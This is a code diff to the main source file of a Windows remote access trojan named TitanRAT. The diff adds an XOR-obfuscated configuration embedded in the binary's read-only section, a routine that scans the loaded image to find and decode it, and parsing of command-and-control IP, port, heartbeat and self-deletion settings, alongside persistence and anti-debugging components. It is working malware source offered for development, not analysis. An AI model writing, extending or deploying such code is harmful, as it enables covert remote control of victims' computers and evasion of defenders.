@@ -1,11 +1,14 @@
-// Core/main.cpp
-#include "network.h" // Это тянет winsock2, windows, string и Config
+// Core/main.cpp — исправленная версия с поиском маркеров через GetModuleHandle
+#include "network.h"
 #include "persistence.h"
 #include "anti_debug.h"
 #include <fstream>
 #include <cctype>
 
-// Теперь Config уже определён через network.h
+#pragma section(".rdata", read)
+__declspec(allocate(".rdata")) const char CFG_START[] = "TITANRAT_CFG_START";
+__declspec(allocate(".rdata")) char CFG_DATA[4096] = {0};
+__declspec(allocate(".rdata")) const char CFG_END[] = "TITANRAT_CFG_END";
 
 constexpr unsigned long long FNV_OFFSET_BASIS = 14695981039346656037ULL;
 constexpr unsigned long long FNV_PRIME = 1099511628211ULL;
@@ -46,6 +49,14 @@ static bool find_int_value(const std::string& json, const std::string& key, int&
     try { out = std::stoi(json.substr(pos, end - pos)); return true; } catch (...) { return false; }
 }
 
+static bool parse_config_json(const std::string& json, Config& cfg) {
+    if (!find_string_value(json, "c2_ip", cfg.c2_ip)) return false;
+    if (!find_int_value(json, "c2_port", cfg.c2_port)) return false;
+    if (!find_int_value(json, "heartbeat_interval", cfg.heartbeat_interval)) return false;
+    if (!find_int_value(json, "auto_delete_days", cfg.auto_delete_days)) return false;
+    return true;
+}
+
 static bool load_config(Config& cfg) {
     char exe_path[MAX_PATH];
     if (!GetModuleFileNameA(nullptr, exe_path, sizeof(exe_path))) {
@@ -82,6 +93,35 @@ static bool load_config(Config& cfg) {
               cfg.c2_ip.c_str(), cfg.c2_port, cfg.heartbeat_interval, cfg.auto_delete_days);
     OutputDebugStringA(log_buf);
     return true;
+}
+
+static bool find_embedded_config(std::string& json) {
+    // Получаем базовый адрес модуля
+    char* base = (char*)GetModuleHandleA(nullptr);
+    if (!base) return false;
+    
+    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
+    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
+    char* end = base + nt->OptionalHeader.SizeOfImage;
+    
+    char* start_pos = nullptr;
+    for (char* p = base; p < end; p++) {
+        if (memcmp(p, CFG_START, sizeof(CFG_START)-1) == 0) {
+            start_pos = p + sizeof(CFG_START)-1;
+            break;
+        }
+    }
+    if (!start_pos) return false;
+    for (char* p = start_pos; p < end; p++) {
+        if (memcmp(p, CFG_END, sizeof(CFG_END)-1) == 0) {
+            int len = (int)(p - start_pos);
+            if (len <= 0) return false;
+            json.assign(start_pos, len);
+            for (char& c : json) c ^= 0xAA;
+            return true;
+        }
+    }
+    return false;
 }
 
 static unsigned long long fnv1a_hash(const char* data, size_t len) {
@@ -141,9 +181,20 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
     
     // Load Config
     Config cfg;
-    if (!load_config(cfg)) {
-        CloseHandle(h_mutex);
-        return 1;
+    std::string embedded_json;
+    if (find_embedded_config(embedded_json)) {
+        OutputDebugStringA("[TitanRAT] Using embedded config\n");
+        if (!parse_config_json(embedded_json, cfg)) {
+            OutputDebugStringA("[TitanRAT] Failed to parse embedded config\n");
+            CloseHandle(h_mutex);
+            return 1;
+        }
+    } else {
+        OutputDebugStringA("[TitanRAT] No embedded config, loading config.json\n");
+        if (!load_config(cfg)) {
+            CloseHandle(h_mutex);
+            return 1;
+        }
     }
     
     // Anti-debug check
